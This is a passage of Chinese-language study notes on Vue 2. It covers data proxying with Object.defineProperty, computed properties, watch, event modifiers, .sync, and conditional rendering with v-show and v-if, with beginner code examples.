  },

  set(val) {
    watchNum = val
  }
})
```

简单的使用原声js的方式实现了一下 计算属性 当我们读取了或者修改了 obj.url 的时候 界面更新
```js 
let urlSource = "www.baidu.com"
let obj = {}

Object.defineProperty(obj, "url", {
  get() {
    return urlSource
  },


  // 主要是在setter中写更新页面的逻辑
  set(val) {
    urlSource = val
    $("#root").innerHTML = obj.url
  }
})

$("#root").innerHTML = obj.url

function $(el) {
  return document.querySelector(el)
}
```

<br>

**<font color="#C2185B">Object.defineProperties(目标对象, {配置对象}): </font>**  
配置多个属性
```js 
{
  propname1: {
    get() {},
    set() {}
  },
  propname2: {
    get() {},
    set() {}
  }
}
```

**例子:**  
```js 
Object.defineProperties(obj, {
  sex: {
    get() {
      return num
    }
  },
  gender: { 
    get() {
      return "男"
    }
  }
})
```

<br>

### **数据代理:**
通过一个对象(A) 操作这个对象(A) 代理对另一个对象(B)中属性的操作(读写)就叫做数据代理  
对象(A)就是代理对象 操作的不是真实对象的本身 而是代理对象
``` 
目标对象: 
  obj = {name: "sam"}

代理对象:
  proxyObj = {}   < -- 通过操作它
```


**案例:**   
比如 有一个obj 它有一个属性x 假如我要访问x那就是 obj.x 改的话就是obj.x = 赋值就可以了

还有一个对象 proxyObj 我想让proxyObj 也能访问到x 也希望proxyObj也能修改x  
通过proxyObj代理对另一个对象obj中的属性去操作 这就是数据代理

*通过代理对象身上的 get set 方法 间接的影响原对象的值*

```js 
let obj = {x: 100}
let proxyObj = {y: 200}

// 通过这个方法在代理对象中添加要访问obj中的属性
Object.defineProperty(proxyObj,  'x', {
  get() {
    return obj.x
  },

  set(value) {
    obj.x = value
  }
})
```


### **示例:**
自己实现了 修改数组 然后自动更新页面的样式的逻辑

**思路:**   
1. classList 数组为class样式数组
2. 创建了一个obj是代理对象 页面上的样式是根据代理对象中的list样式数组渲染的
3. 而obj代理对象中的list是从classList上获取的值
4. 当我们修改了代理对象中list的值后 就会更新页面上的样式

```js 
// a b c 都是样式名
let classList = ["a", "b", "c"]
let target = $("ul li")[0]

// 代理对象
let obj = {}
Object.defineProperties(obj, {
  list: {
    get() {
      return classList
    },
    set(v) {
      classList = v
      target.className = obj.list.join(" ")
    }
  }
})

target.className = obj.list.join(" ")
obj.list = [...target.classList, "d"]
obj.list = [...target.classList, "e"]

function $(el) {
  return document.querySelectorAll(el)
}
```

<br><br>

### **vue中的数据代理**
接下来我们看看 Vue里面是怎么使用数据代理的  
我们将变量name定义在data中(vue会将我们传入的data保存在vm身上一份 vm._data)
```js 
vm._data = data
```

有人当读取name的时候getter开始工作 getter就会将data中的name给过去  
有人通过vm来修改name的时候 setter开始工作 setter就会将data中的name修改掉
```js 
const vm = new Vue({
  el: '#root',
  data:{
    name: 'sam'
  }
})


有人读取name   < ---  getter  < ---  data.name
有人修改nama   --- >  setter  --- >  data.name
```  

<br>

### **总结**
vue中的数据代理: 通过vm对象来代理data对象中的属性的操作
vue中数据代理的好处: 更加方便的操作data中的数据

<br>

**基本原理:** 
通过 Object.defineProperty 把data对象中所有的属性添加到vm上 为每一个添加到vm上的属性 都指定一个getter setter 在getter setter 内部去操作data中对应的属性


<br><br>

# 数据劫持
上面有一句话 从开始 贯穿到 现在 就是 假如data中的数据发生变化 页面中使用data数据的地方就会自动更新
```js 
data.name 变化了    // view 中使用 name 的地方 就会自动更新
```

要想实现这个功能 那就需要让vue监测到data中的数据改变了 如果vue监测不到data中的属性发生了变化 那vue怎么帮你去更新页面呢 为了完成这个功能它就必须将_data中的东西进行一番修改
```js 
// 我们前面说 
const vm = new Vue({
  el: '#root',
  data:{
    name: 'sam'
  }
})

// 我们传入的data 会保存在_data中一份 原本我们期待_data中的数据结构也是一样的

data:{                _data:{   
  name: 'sam'           name: 'sam'
}                     }

// 但事实上不是 vue将_data中的数据 又做了一番处理 为了实现响应式
```

<br><br>

# 计算属性:
我们先了解一下什么叫做属性 对于vue来说 它认为data中的数据就是属性  
所谓的计算属性 就是拿着已有的属性 去加工去计算然后得到一个全新的属性 

计算属性书写在 computed配置项 中它的类型是一个对象

<br>

### **定义:**
data中不能定义计算属性 可以利用data已有的属性计算出新的结果

<br>

### **原理:**
底层借助了Object.defineproperty方法提供的getter 和 setter

<br>

### **优势:**
与methods相比 内部有缓存机制 复用效率更高 调试方便

<br>

**注意:**  
计算属性最终会在vm身上 直接读取使用即可(通过this)  
如果计算属性要被修改 那必须要写set函数去响应修改 *且set中要引起计算时依赖的数据发生改变*
```js 
new Vue({
  el:'#root',
  data() {
    return {
      firstName: '张',
      lastName: '三'
    }},

  methods: {
    showInfo() {
      return this.firstName + '-' + this.lastName
    }},

  // 计算属性的配置项
  computed:{ }
})
```

<br>

### **计算属性的对象写法:**
computed配置项的类型为: {} 内部的结构为
```js
computed: {
  计算属性名: { }   // 对象写法
}
```
对象有有两个方法 get set get 和 set中的this就是vm

```js 
computed: {
  attr: {
    get() {},
    set() {}
  }
}
```

```js 
computed:{
  fullName: {

    // 当有人读取fullName的时候get就会被调用 且返回值就是fullName的值
    get() {
      return this.firstName + '-' + this.lastName
    },

    // 如果我们的数据就是读取给别人用的话 set就可以不用写了 当我们的fullName以后会被修改的话 我们就要写set 当fullName被修改的时候该函数会被调用
    set(value) {
      const arr = value.split('-')
      this.firstName = arr[0]
      this.lastName = arr[1]
    }
  }
}
```

**get方法调用的时机:**  
1. 初次调用fullName时 get会被调用
2. 所依赖的数据发生变化的时候 get会被调用

上面的案例中就是不管姓还是名被修改的时候get都会重新调用 但是依赖数据没有发生变化的时候 计算属性 fullName 会走缓存


**set方法调用的时机**  
如果我们的数据就是读取给别人用的话 set就可以不用写了 当我们的fullName以后会被修改的话 我们就要写set 当fullName被修改的时候该函数会被调用

<br>

### **计算属性的函数写法:**
更多的情况是 计算属性是不需要修改的 更多的是计算出来在页面上做呈现  
这时候就不需要set方法 这时候我们就可以简写计算属性 将属性名写成一个函数 函数体的内容就是计算属性的属性值

函数内部需要 return 返回值 作为计算属性的值
```js 
computed:{
  fullName() {
    return this.firstName + '-' + this.lastName
  }
}
```

<br>

### **总结:**
1. 计算属性直接写函数名就可以 当属性名使用
2. 计算属性一直监听数据的变化 如果有变化立即返回一个值  
computed 还有一个功能就是 **缓存的功能** 就是 当数据不变化的时候就一直保存之前的值 不管你使用多少次  
计算属性监听的是computed内部的数据, 当页面上和computed内部一致的数据发生变化时, computed内部数据会重新计算渲染页面上 也就是说页面上的数据和computed里面的数据是相互关联的
3. 计算属性在多次调用的时候只会调用一次, methods的话你调用几次就会在实例中执行几次, 计算属性的性能会比较好
4. 在html结构中 直接使用变量名 不用加()调用函数
```js 
<h3>{{computed中的变量名}}</h3>
```

<br>

### **利用计算属性 监视 对象**
```js
<script>
export default {
  name: 'App',
  data() {
    return {
      obj: {
        name: "sam",
        age: 18
      }
    }
  },
  computed: {
    computedObj() {
      return this.obj
    }
  },
  methods: {
    changeObj() {
      this.obj.name = "nn"
    },
  }
}
</script>
```

<br>

### **案例: v-model & computed setter**
需求:
选项卡案例 点击选项卡 显示对应的内容
```
    Tab1    Tab2    Tab3

    ---

    内容区
```

**结构:**  
**1. App 组件:**  
包括两部分内容 Tab按钮区 和 内容区

<br>

**2. TabBar 组件:**  
Tab按钮区 一个 Tab1

**作用:**  
1. 通过 App 组件传递过来的数据 遍历生成 Tab
2. Tab的文字是通过 ``<Tab>`` 中定义的插槽实现的

```html
<Tab 
  v-for="(item, index) in data" 
  :key="index"
  :value="item.label"
>
  <!-- 这个就是向 <Tab> 组件中的 <slot> 传递数据 -->
  {{item.label}}    
</Tab>
```

3. 通过 :value="item.label" 向 <Tab> 组件传递 信息(数据)
4. 该组件中定义了 tigger() 是给 子组件通过 this.$parent 调用的 目的就是向App组件派发事件

5. 该组件相当于一个壳 并不负责渲染UI结构 而是传递数据 和 向App派发事件

**3. Tab 组件**  
主要负责渲染UI结构 通过 插槽显示内容 调用TabBar组件的事件tigger事件

App
```html
<template>
  <div>
    <!-- selectedLabel并不是定义在data中的 而是通过计算属性得到的 它会根据index获取tabs数组中对应的数据 -->
    <TabBar
      :data="tabs"
      v-model="selectedLabel"
    />

    <h1>当前选项: {{selectedLabel}}</h1>
  </div>
</template>

<script>
import TabBar from "./components/TabBar.vue"
export default {
  components: {TabBar},
  data() {
    return {
      index: 0,
      tabs: [
        {label: "选项1"},
        {label: "选项2"},
        {label: "选项3"},
      ]
    }
  },
  computed: {
    selectedLabel: {
      get() {
        return this.tabs[this.index].label
      },
      set(newVal) {
        this.index = this.tabs.findIndex(item => {
          return item.label == newVal
        })
      }
    }
  },
  mounted() {
    console.log(this.tabs)
  }
}
</script>
```


TabBar
```html
<template>
  <div>
    <Tab 
      v-for="(item, index) in data" 
      :key="index"
      :value="item.label"
    >
      {{item.label}}
    </Tab>
  </div>
</template>

<script>
import Tab from "./Tab.vue"
export default {
  components: {
    Tab
  },
  props: {
    data: Array
  },
  methods: { 
    trigger(value) {
      console.log(value)
      this.$emit("input", value)
    }
  }
}
</script>
```

Tab
```html
<template>
  <div @click="handleClick">
    <slot></slot>
  </div>
</template>

<script>
export default {
  props: {
    value: String
  },
  methods: {
    handleClick() {
      this.$parent.trigger(this.value)
    }
  }
}
</script>
```

**总结:**  
在使用 组件的 v-model 的时候 需要做两件时间

1. 子组件接收 props: ["value"] (默认情况下 没有model配置项)
2. 子组件要派发 input 事件 (默认情况下 没有model配置项)
3. 派发的事件的第二个参数 会重新赋值给 v-model="这个变量"

<br>

### 案例: 计算属性的应用 求出总价格
需求: 页面上输出总价格

```js 
<div id="app">
  <h3>总价格:{{totalPrice}}</h3>
</div>

const app = new Vue({
  el: '#app',
  data: {
    books: [
      {id:1, name:'unix编程艺术', price:119},
      {id:2, name:'代码大全', price:105},
      {id:3, name:'深入理解计算机原理', price:98},
      {id:4, name:'现代操作系统', price:87}
    ]
  },

  computed: {
    totalPrice: function() {
      let result = 0;
      for(let i = 0 ; i<this.books.length; i++) {
        result += this.books[i].price;
      }

      return result;
    }

    // 使用es6的 reduce方法
    totalPrice: function() {
      let result = this.books.reduce(function(tmp, item, index){
        return tmp + item.price;
      }, 0)

      return result;
    }
  }


  // 整理一下的写法
  total() {
    return this.books.reduce((pre, item) => pre += item.price, 0)
  }

})
```

<br><br>

# 监视属性 watch
需求: 点击按钮 更新天气状态

下面我们使用的是计算属性完成的逻辑 逻辑很简单 通过计算属性决定展示在页面上的值是什么 然后通过点击按钮改变计算属性中依赖的变量的值
```html
  <div @click='showWeather'>
    今天天气很 {{info}}  
  </div>

<script>
  new Vue({
    el: '#root',
    data() {
      return { isHot: false }
    },
    computed: {
      info() { return this.isHot ? '炎热' :'凉爽' }
    },
    methods: {
      showWeather() { this.isHot = !this.isHot }
    }
  })
</script>
```

但是上面的做法有一个坑 就是当我页面上不使用 计算属性的时候 我点击按钮
开发者工具显示没有改变数据 但实际是改变了
```js 
  // 比如我点击按钮后 正常 开发者工具会显示
  isHot: false  --- isHot: true

  // 实际上 开发者工具会显示
  isHot: false  --- isHot: false

  // 但数据其实是改了的 只是开发者工具会有问题
```

<br>

### **监视属性:**
```js
watch配置项: {} 
```

**作用:**  
监视属性的变化 在配置项中写监视谁 监视哪个属性 *不仅可以监视data中的属性 计算属性也可以监视 还可以监视路由*

**注意:**  
在watch里面配置监视属性的时候 要监视的属性前面 *不用使用this*  
但是在监视属性内部的配置函数 handler 里面要想获取data中的变量要写this

<br>

**<font color="#C2185B">对象写法: </font>**  
```js
watch: { 
  要监视的属性: { 

    // 当要监视的属性发生变化时 会自动调用该回调
    handler(新值 旧值) { 不需要return 可以直接写逻辑 }

    // 初始化时让handler调用一下 默认值是false 立即马上执行
    immediate: false

    // 当为true的时候开启深度监视
    deep: true
  }
}
```

watch的类型是一个对象 要监视的属性的值也是一个对象 对象里有handler函数 该函数在监视的属性发生变化的时候回被调用
```js 
// 比如上面的案例 我们点击按钮后修改了 变量 isHot 现在我想监视isHot的变化 只要它发生了变化就要通知我
watch: {
  isHot: {
    // 当isHot发生变化的时候该函数会被调用
    handler(newValue, oldValue) { }

    // 立即马上执行 默认值是false 初始化时让handler调用一下
    immediate: false
  }
}
```

那有什么作用呢？比如我们保存的是温度 那我就可以拿到新的温度和旧的温度 相减拿到差后做后续的逻辑 对一个属性做监测 然后对比 然后做逻辑处理

<br>

**<font color="#C2185B">配置: immediate</font>**  
当为false的时候 只有监视的属性发生改变的时候才会执行handler里面的代码  
当为true的时候 监视属性没有发生改变 一上来就会执行一遍handler里面的代码

**注意:**  
handler函数中 一上来的时候 oldValue为undefined newValue为一上来展示的值

<br>

**<font color="#C2185B">配置: deep</font>**  
深度监视 vue中的watch默认不监测对象内部值的改变 一层   
deep: true 可以监测对象内部值的改变

**备注:**  
vue自身可以监测对象内部值的改变 但vue提供的watch默认不可以 使用watch时 根据数据的具体结构 决定是否开启深度监测

<br>

需求: 我需要监视numbers里面的a属性 不监视b怎么做？
```js 
data: {
  numbers: {
    a: 1
    b: 1
  }
}

watch: {

  // 注意属性名的本质是字符串 我们不能直接值 number.a 的形式
  'number.a': {
    handler(n, o) {
      console.log(n, o)
    }
  }


  // 那假如我们这么写能监测到number的变化么 
  'number': {
      handler(n, o) {
        console.log(n, o)
      }
    }
  }
}
```

答案是不能 因为这么写是监测number:{ } vue将整个对象当做监视的对象 并不是对象里面的某一个值 也就是vue监视的这个对象的地址值 而这个对象中的属性发生变化 vue并不能监测到 那怎么才能监测到呢？

为了完成深度监视 我们可以开启深度监视 在监视的属性的配置对象中添加 deep: true
```js 
  'number': {
      handler(n, o) {
        console.log(n, o)
      }

      // 监视多级结构中所有属性的变化
      deep: true
    }
  }
```

<br>

**监视的简写形式:**  
简写形式的前提是 你不需要deep 不需要immediate的时候 当只有handler的时候就可以开启简写形式

将要监视的属性 写成一个函数的形式 函数名就是监视的属性名
```js 
watch: {
  isHot(n, o) {

  }
}
```

<br>

**总结:**
监视属性watch 当被监视的属性变化的时候 回调函数自动调用 handler 进行相关操作
监视的属性必须存在 才能进行监视  
监视属性的两种写法  

- new Vue时传入watch配置对象
- 通过vm.$watch监视 通过vue实例 调用 $watch方法  
参数1 监视谁  
参数2 回调 当a发生改变的时候 会在回调里面
```js 
vm.$watch('a', function(newVal, oldVal) {
  // 做点什么 this 是vm
})
```

<br>

**技巧:**  
- watch还可以监视$route 
- watch还可以监听数组中一项的属性
```js
watch: {
  // 监听 数组中第0项的name属性
  "arr.0.name"() {

  }
}
```

<br><br>

# watch 和 computed 的对比
上面的案例中我们是通过计算属性来得到fullName
现在我们使用一下watch来做 那我们就要思考 我们要监视谁 应该是firstName 和 lastName吧
```js 
data: {
  fullName: 'zhang-san'
}

watch: {
  firstName(n) {
    this.fullName = n + this.lastName
  }

  lastName(n) {
    this.fullName = this.firstName + n
  }
}
```

使用watch做的话会比较麻烦我们要准备好一个fullName 还要分别对 姓 和 名 进行监视 上面感觉是计算属性来实现会比较好一些 但是有的时候可能watch会比较好

比如: 当姓发生改变的时候 全名延迟1秒再发生变化
```js 
// watch
firstName(n) {
  setTimeout(()=>{
    this.fullName = n + this.lastName
  }, 1000)
}
```

<br>

**总结:**  
- *监视属性里可以开启异步任务来维护数据*
- 计算属性里不能开启异步任务来维护数据
```js 
computed: {
  fullName(n) {
    setTimeout(()=>{

      // 计算属性靠着函数内部的return来得到属性值 但是 异步的timeout是将返回值给timeout了而不是给fullName了 所以fullName的返回值是undefined
      return this.firstName + this.lastName
    }, 1000)
  }
}
```

computed能完成的功能 watch都可以完成 watch能完成的功能 computed不一定能完成 例如 watch可以进行异步操作

<br>

**两个重要的小原则:**
- 被vue管理的函数 最好写成普通函数 这样this的指向才是vm或者组件实例对象
- 所有不被vue管理的函数 定时器 ajax回调等 最好写成箭头函数 这样this的指向才是vm或者组件实例

<br><br>

# 事件的监听 / 处理
在前端开发中, 我们需要经常和用户交互, 这个时候 我们就必须监听用户发生的事件, 比如点击 拖拽 键盘事件等等

Vue中的事件 和 回调 要定义在 methods配置项 中

**注意:**
- *methods中配置的函数 不要用箭头函数 否则this就不是vm了*
- methods中配置的函数 都是被vue管理的函数 this的指向是vm 或 组件实例对象 事件的回调需要配置在methods中 最终会在vm上

<br>

### **v-on:事件名="事件处理函数"   指令**
作用: 绑定事件监听器
简写: @+事件名   
```js 
v-on:click  ==  @click

@事件名=回调函数
```

参数: event(不传递实参的情况下 默认能接收到event)

<br>

### **v-on的简单用法**
因为指令语法 "" 里面可以写表达式
```js 
<div id="app">
  <button v-on:click='count++'>+</button>
</div>
```

<br>

### **v-on: 的语法糖 @事件名**
```js 
<button @click='dec'>-</button>
```

<br>

### **@事件名="事件处理函数"**
**<font color="#C2185B">不传递参数的情况: </font>**   
回调中接收到的是 event 事件对象
```js 
<button @click='add'>+</button>

methods: {
  // 该方法会接收到event对象 vue帮我们传递进来的
  add(event) { this.count++; },
}
```

<br>

**<font color="#C2185B">传递参数的情况: </font>**   
我们可以直接在小括号中写参数 如果同时要使用 event 需要用 $event 关键字来占位 $event需要放在形参最后

```js 
<button @click='add(66, $event)'>+</button>
methods: {

  // 该方法会接收到event对象 vue帮我们传递进来的
  add(number, event) { 
    console.log(number)
    console.log(event.target)
  },
}
```

<br>

### **@click.native: 给组件绑定 原生事件**
正常我们在组件标签内部使用 @click 的时候 vue都会把这些原生事件当做自定义事件处理

如果我们想给组件绑定原生的点击事件 我们要使用.native修饰符
```js 
<Student @click.native='callback'>
```

<br><br>

# 修饰符 v-bind + .sync
**作用:**  
将父组件传递给子组件的数据 实现双向绑定

**使用位置:**   
```js
<子组件 :title.sync="title">
```

<br>

**回顾: 正常我们修改父组件传递进来的数据应该怎么处理?**
- 使用 v-bind 将title数据交给 子组件
- 子组件在想修改 title数据的时候 要将新数据传回父组件 由父组件进行修改  

所以 使用了 给子组件绑定自定义事件 + 子组件内部使用 $emit("自定义事件") 的方式 拿到子组件传递出来的新数据 在父组件的自定义事件中进行赋值的处理
```js 
<子组件 :title="title" @update:title="title = 新数据">
  ...
</子组件>

// 子组件
<button @click="changeTitle">
methods: {
  changeTitle() {
    this.$emit("update:title", "新数据")
  }
}
```

<br>

### **要点:**
1. 父组件通过props传递到子组件中的数据 要是想修改的时候 请利用 emit 派发事件 让父组件进行修改
2. 自定义事件可以起 update:title 这样的名字 不错啊！！！

<br>

### **.sync的使用:**
.sync相当于我们把title传递到子组件的同时 再监听子组件派发的自定义事件  
监听的事件名是固定的写法:**update:传递过去的数据** 子组件派发的事件名 比如是 update:title
```js 
<子组件 :title.sync="title">
  ...
</子组件>
```

**代码部分:**  
```html
// App父组件
<template>
  <div>
    <h3>App组件</h3>
    <hr>
    <Child :title.sync="title"/>
  </div>
</template>

<script>
import Child from "./components/Child.vue"
export default {
  components: {Child},
  data() {
    return {
      title: "sam"
    }
  }
}
</script>
```

Child子组件
```html
<template>
  <div>
    <h3>Child组件 -- {{title}}</h3>
    <button @click="changeTitle">Update</button>
  </div>
</template>

<script>
export default {
  props: ["title"],
  methods: {
    changeTitle() {
      // 派发事件名的格式
      this.$emit("update:title", "erin")
    }
  }
}
</script>
```

<br>

**技巧:**  
当我们想将对象中的属性传递给子组件的时候 这样就相当于v-bind="对象" 会将对象中的所有属性传递过去  
但是子组件的派发自定义事件还是得照做
```js 
<子组件 v-bind.sync="obj"></子组件>
```

<br><br>

# 事件的修饰符
在某些情况下, 我们拿到event的目的可能是进行一些事件的处理 vue提供了修饰符来帮助我们方便的处理一些事件

**技巧:** 修饰符可以连续写

<br>

### **语法: @事件名.修饰符**
修饰符还可以串联使用
```js 
<button @click.stop.prevent='doThis'>点击</button>
```

<br>

**<font color="#C2185B">停止冒泡: @事件名.stop</font>**  
相当于调用 event.stopPropagation()  

当结构出现嵌套的时候 子元素的事件会冒泡到父元素上 **阻止冒泡一般加载子元素的身上**
```js 
<button @click.stop='doThis'>点击</button>
```

<br>

**<font color="#C2185B">阻止默认行为: @事件名.prevent</font>**  
相当于调用 event.preventDefault()
```js 
<button @click.prevent='doThis'>点击</button>
```

<br>

**<font color="#C2185B">回调仅触发一次: @事件名.once</font>**  
只触发一次回调
```js 
// 事件的回调只触发一次
<button @click.once='doThis'>点击</button>
```

**实际工作中的应用场景:**  
有的时候 只想让这个功能实现一次 我们就使用了once 但是如果发生了网络错误之类的现象 用户点击了一次之后不能再次点击了 体验不好 这是后我们就搭配上了 try catch
```js 
try {

} catch() { 在这里再次的绑定了once事件 }
```

<br>

**<font color="#C2185B">使用事件的捕获模式: @事件名.capture</font>**  
嵌套结构的时候会有捕获的情况 一般该修饰符加在父元素身上

<br>

**<font color="#C2185B">只有event.target是当前操作的元素时候才可以触发: @事件名.self</font>**  
某种程度上说 .self 也能阻止冒泡
```js 
  <div @click.self='showInfo'>
    <button @click='showInfo>
  <div>
```
我们加在了父元素的身上 如果有人触发了div身上的click 并且target是div的时候才会调用showInfo  
我们点击的是button 然后会产生冒泡 div身上的click事件也会触发 但是 div的click事件是有条件的 只有target是自己 事件也是自己的时候才会触发  
所以button的click的事件是冒泡到div上了 但是却不会触发

<br>

**<font color="#C2185B">事件的默认行为立即执行 无需等待事件回调执行完毕: @事件名.passive</font>**  
当我们给内容溢出的父元素绑定 wheel事件的时候 会产生一个问题 它会先执行回调的内部逻辑 执行完毕后再触发默认行为 滚动滚动条  
当我们给wheel.passive加上这个修饰符的时候 会先执行默认的行为比如滚动滚动条 然后再处理回调的内部逻辑  

移动端的项目可能会用的比较多一些

<br>

**扩展: @scroll**  
是滚动滚动条的时候 会触发事件
scroll的特点 当滚动条到底了 再次滚动滚动条的时候不会触发事件了

<br>

**扩展: @wheel**  
**特点:**   
1. 鼠标滚轮滚动的时候 会触发事件
2. 当鼠标滚轮滚动的时候 会先触发滚动的事件 执行内部的回调 回调执行完毕后再执行默认行为(将滚动条往下滚动)

wheel的特点 即使滚动条到底了 我们滚动滚轮的时候也会触发事件

<br>

**<font color="#C2185B">给组件绑定事件: @事件名.native</font>**  
在我们需要监听一个组件的原生事件时, 必须给对应的事件加上.native修饰符 才能监听
```js 
// 但是vue3.0已经删除, 不添加该修饰符也可以给组件绑定事件
<back-top @click.native='callback'></back-top>
```

<br>

### **案例: 阻止事件冒泡**
下面的例子中 点击按钮后 同时也会触发 div的点击事件
```js 
<div id="app">
  <div class='test' @click='divClick'>

    // 阻止按钮的点击事件冒泡
    <button @click.stop='btnClick'>按钮</button>
  </div>
</div>
```

<br>

### **案例: 阻止默认行为**
下面的例子里, <input type="submit"> 的情况下 点击这个按钮会把form表达里的数据收集起来提交到指定页面上, 有些情况下我不希望它自动帮我提交 当我点击这个按钮的时候 做些逻辑处理后再提交, 可是如果不阻止input的默认行为的话, 提交表单的功能和回调中的逻辑处理的顺序是 提交表达先发生的, 所以要阻止表单的默认行为
```js 
<input type='submit' @click.prevent='submitClick'>
```

<br>

**<font color="#C2185B">键盘事件按下特定的键触发回调: @事件名.(keyCode | keyAlias | enter) || 按键别名</font>**  
只当事件是从特定键位触发时才触发回调

**常用的按键别名:**  
- keyCode  
键盘编码  @keyup.13 **该方式不被推荐了 尽量不要使用该方式 请使用别名**

- enter:    
回车

- delete:   
删除

- esc       
退出

- space     
空格

- tab       
退格 该按键有一个神奇的功能就是将焦点切走 它要配合keydown来使用

- up
- down
- left
- right

vue未提供别名的按键 可以使用按键原始的key去绑定 当按键名称由多个单词组成的时候我们要使用aaa-bbb的形式连接使用(短横线命名)
```js 
console.log(e.key, e.keyCode)    // CapsLock 13
@keyup.caps-lock
```

**系统修饰键:**  
ctrl alt shift meta
- 配合keyup使用  
按下修饰键的同时 再按下其他键 随后释放其他键 事件才会被触发

- 配合keydown使用  
正常触发事件

- 系统修饰键.按键
只有系统修饰键和按键配合使用的时候才会触发回调 @keyup.ctrl.y

```js 
// 只有按下 enter 键位的时候才会被触发回调
<input 
  type="text" 
  value='' 
  placeholder="输入文字" 
  @keyup.enter='showInfo'
>
```

<br>

### **配置按键的别名:**
语法: Vue.config.keyCodes.别名 = 键码

```js 
Vue.config.keyCodes.huiche = 13
```

<br><br>

# v-show
v-show的用法 和 v-if非常相似, 也用于决定一个元素是否渲染  
vue会根据表达式的布尔值决定该元素是显示还是隐藏 表达式中如果写变量的情况下 它会去data中找变量

**语法:**   
```html
<div v-show='表达式'>测试段落</div>
```

<br>

**注意:**   
使用v-show来控制显示和隐藏的元素 本质是通过 display: none / block 来控制的 它的节点还在

```js 
<div v-show='1 === 1'>测试段落</div>
<div v-show='false'>测试段落</div>
```

<br><br>

# v-if, v-else-if, v-else 
这三个指令与js的条件语句if else else if类似  
vue的条件指令可以根据表达式的值 在dom中渲染或销毁元素 或 组件

**注意:**  
dom的结构会根据v-if的结果 销毁 和 创建 反复执行这两个过程

**应用场景:**  
当满足条件的时候 我才希望元素渲染在dom结构中 不满足条件的时候 不希望它渲染出来 一般都是在服务器端传过来的数据 决定某一大段需要不需要显示在dom结构中

<br>

**语法:**  
```js
v-if='布尔类型的值 或者 表达式'
```

<br>

### **案例: 简单的使用v-if v-else**
我们通过控制isShow变量的值 来决定显示哪个部分, 但为true的时候显示v-if的部分, 当为false时, 会显示v-else的部分  
我们看下下面的按钮是用v-show来实现的 当点击按钮后 n会加1 当n的值为1 2 3的时候会显示对应的div
```js 
// 当我点击按钮的 data 中的n发生了变化 用到n的地方就会重新解析 发生 n == 1 是成立的于是乎就显示了
<div id="app">
  <div v-show='n==1'>react</div>
  <div v-show='n==2'>vue</div>
  <div v-show='n==3'>angular</div>

  <button @click='n++'>点我加1</button>
</div>

const app = new Vue({
  el:'#app',
  data: {
    n: 0
  }
})
```

<br>

### **v-if, v-else if, v-else**
它的逻辑和我们js中的逻辑一样 一旦v-if成立就不会走v-else if的逻辑
这种场景用的不多, 因为这需要在标签内部写很多逻辑, 遇到这种情况不如在computed中计算好在拿出来

```js 
// 标签中写入if else if else
<div id="app">
  <p v-if='score>=90'>优秀</p>
  <p v-else-if='score>=80'>良好</p>
  <p v-else-if='score>=60'>及格</p>

  // 它不用接条件
  <p v-else>不及格</p>
</div>

const app = new Vue({
  el:'#app',
  data: {
    score:90
  }
})

// 会把符合条件的结构渲染在html结构中
```

<br>

### **总结:**
当我们页面的dom元素切换的比较频繁的时候 建议使用v-show

**注意:**  
if else if else 中间不要被打断 打断后就失效了 v-if 必须是最先开始使用的
```js 
<div v-if='n==1'>react</div>

<div>@</div>    // 打断了

<div v-else-if='n==2'>vue</div>
<div v-else='n==3'>angular</div>
```

<br>

### **``<template>`` 和 v-if 的配合使用**
它不会影响结构 当页面最终渲染的时候 vue会将 template 标签脱掉  
优点: 不会破坏页面的html结构

**注意:**  
它能配合 v-if 的使用 也可以和 v-for 配合使用 同时*v-for*的逻辑 要比 v-if的*优先级高*

```js 
// 需求 当 n = 1 的时候展示下面的 h2

<h2 v-if='n == 1'>你好</h2>
<h2 v-if='n == 1'>你好</h2>
<h2 v-if='n == 1'>你好</h2>

// 这样n = 1的时候 3个h2都会显示 我们还可以这样


<div v-if='n == 1'>
  <h2>你好</h2>
  <h2>你好</h2>
  <h2>你好</h2>
</div>

// 但是上面那样破坏了html的结构 还有另外的一种方式


<template v-if='n == 1'>
  <h2>你好</h2>
  <h2>你好</h2>
  <h2>你好</h2>
</template>

// template 可以和 v-if 配合使用 不会添加html结构
```

<br>

### 案例: 条件渲染
需求: 用户在登录的时候, 可以切换使用 用户账号登录 还是 邮箱地址登录

    用户账号: | 用户账号 |  | 切换类型 |

```html
<div id="app">

  <!-- 
      当满足条件的时候显示if里面的结构, 当不满足条件的时候我们显示else里面的结构 
    -->
  <span v-if='isUser'>
    <label for="username">
      用户账号:
    </label>

    <!-- 注意这里增加了key值 -->
    <input type="text" placeholder='用户账号' id='username' key='username-input'>     
  </span>

  <span v-else>
    <label for="email">
      用户邮箱:
    </label>
    <!-- 注意这里增加了key值 -->
    <input type="text" placeholder='用户邮箱'  id='email' key='email-input'>
  </span>
  
  <button @click='isUser=!isUser'>切换类型</button>
</div>

<script>
  const app = new Vue({
    el:'#app',
    data: {
      // 我们在这里定义一个状态
      isUser:true
    }
  })
</script>
```

<br>

**增加key值的原因:**  
输入框内的文本会被vue复用到另一个结构中 所以利用key值来区分 不让它复用  
是不是一般这种情况都出现在文本框类的input中

<br>

**vue重复利用dom结构的问题:**  
在标签中添加自定义属性 key='value', 我们要保证key的值的不同
key的值如果一样, 那么vue就会认为可以复用 如果不一样就认为不可以不复用 会创建一个新的结构

```html
  <input 
    type="text" 
    placeholder='用户账号' 
    id='username' 
    key='username-input'
  >
```

**上面的案例存在一些小问题:**  
当我们在用户账号上的文本输入框里输入文本后, 点击切换类型后 原来在用户账号的文本框里的文字, 会显示在用户邮箱的文本框里  
可为什么明明是两个文本框 在第一个文本框里的文本 会出现在第二个文本框中呢 按道理来讲, 我们应该切换到另外一个input元素中了, 在另一个input元素中, 我们并没有输入内容, 为什么会出现这个问题呢?

<br>

**问题解答:**  
这是因为vue在进行dom渲染时, 出于性能考虑, 会尽可能的复用已经存在的元素, 而不是重新创建新的元素  
假如我们现在有一个div 我们准备把它渲染到浏览器的上面, vue内部并不会把这div直接渲染在浏览器上面, 它会做一层中间环节, 给你搞一个虚拟dom, 把我们要渲染的东西 先放在虚拟内存里面, 然后再把虚拟DOM渲染到浏览器上面
```
  div   --- >   虚拟DOM   --- >   真实浏览器
```
vue在虚拟DOM中vue出于性能的考虑会尽可能的复用已经存在的元素 虚拟DOM是真实DOM的一种映射 在上面的额案例中, vue内部会发现原来的input元素不再使用, 直接作为else中的input来使用了

<br>

**解决方案:**  
如果我们不希望vue出现类似重复利用的问题, 可以给对应的input添加key 并且我们需要保证key的不同

<br><br>

# 列表渲染 v-for 遍历数组
当我们有一组数据需要在页面上进行渲染时, 我们就可以使用v-for来完成 我们想生成哪个结构就在哪个结构上 使用 v-for
```js 
